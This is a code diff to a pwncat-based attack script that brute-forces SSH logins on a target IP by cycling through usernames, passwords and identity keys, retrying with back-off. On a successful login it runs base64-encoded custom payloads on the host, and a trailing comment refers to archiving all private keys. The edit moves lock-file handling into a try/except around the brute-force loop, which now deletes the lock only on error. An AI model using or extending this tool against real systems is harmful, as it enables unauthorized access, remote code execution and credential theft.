@@ -58,8 +58,6 @@ def signal_handler(sig, frame):
 
 def execute(session: pwncat.manager.Session, task):
     session.log("starting module")
-    session_lock = Path("/tmp/pwncat_connector_session.lock")
-    session_lock.touch()
     try:
         if task == "custom":
             payload = base64.b64encode(str(args.payload).encode("utf-8"))
@@ -153,8 +151,6 @@ done'''.encode("utf-8"))
             session.log("connector session complete")
     except Exception as e:
         session.log(f'Error executing bash script: {e}')
-    finally:
-        session_lock.unlink()
 
 
 def attempt_ssh_connection(user, credential, credential_type, target_ip, target_port, task):
@@ -301,40 +297,47 @@ if args.add_default_users:
 success = False
 max_retries = 3  # Maximum retry attempts
 
-for credential_type in ["password", "identity"]:
-    for user in users:
-        credentials = passwords if credential_type == 'password' else identities
-        for credential in credentials:
-            retries = 0  # Retry counter
-            while retries < max_retries:
-                success, retry, session = attempt_ssh_connection(
-                    user, credential, credential_type, args.target_ip, args.target_port, args.task)
-                if success:
-                    print(
-                        f"Successful {credential_type} authentication: {user} with {credential}")
-                    break  # Exit the credential loop if a successful connection was made
-                elif retry:
-                    retries += 1
-                    print(f"Attempt {retries} failed for {user}.")
-                    if retries < max_retries:
-                        print(f"Retrying... ({retries}/{max_retries})")
-                        # Sleep to avoid immediate reconnection
-                        time.sleep(retries*30)
-                    else:
-                        print(
-                            f"Maximum retries reached for {user} with {credential_type}.")
-                else:
-                    # failed authentication - continue iterating username/credentials
-                    print(
-                        f"Failed {credential_type} authentication: {user} with {credential}")
-                    break
-            if success:
-                break  # Exit the credential loop if a successful connection was made
-        if success:
-            break  # Exit the user loop if a successful connection was made
-    if success:
-        break  # Exit the credential_type loop if a successful connection was made
+session_lock = Path("/tmp/pwncat_connector_session.lock")
+session_lock.touch()
 
+try:
+    for credential_type in ["password", "identity"]:
+        for user in users:
+            credentials = passwords if credential_type == 'password' else identities
+            for credential in credentials:
+                retries = 0  # Retry counter
+                while retries < max_retries:
+                    success, retry, session = attempt_ssh_connection(
+                        user, credential, credential_type, args.target_ip, args.target_port, args.task)
+                    if success:
+                        print(
+                            f"Successful {credential_type} authentication: {user} with {credential}")
+                        break  # Exit the credential loop if a successful connection was made
+                    elif retry:
+                        retries += 1
+                        print(f"Attempt {retries} failed for {user}.")
+                        if retries < max_retries:
+                            print(f"Retrying... ({retries}/{max_retries})")
+                            # Sleep to avoid immediate reconnection
+                            time.sleep(retries*30)
+                        else:
+                            print(
+                                f"Maximum retries reached for {user} with {credential_type}.")
+                    else:
+                        # failed authentication - continue iterating username/credentials
+                        print(
+                            f"Failed {credential_type} authentication: {user} with {credential}")
+                        break
+                if success:
+                    break  # Exit the credential loop if a successful connection was made
+            if success:
+                break  # Exit the user loop if a successful connection was made
+        if success:
+            break  # Exit the credential_type loop if a successful connection was made
+except Exception as e:
+    print(f"exception: {e}")
+    if session_lock.exists():
+        session_lock.unlink()
 exit(0)
 
 # archive all private keys
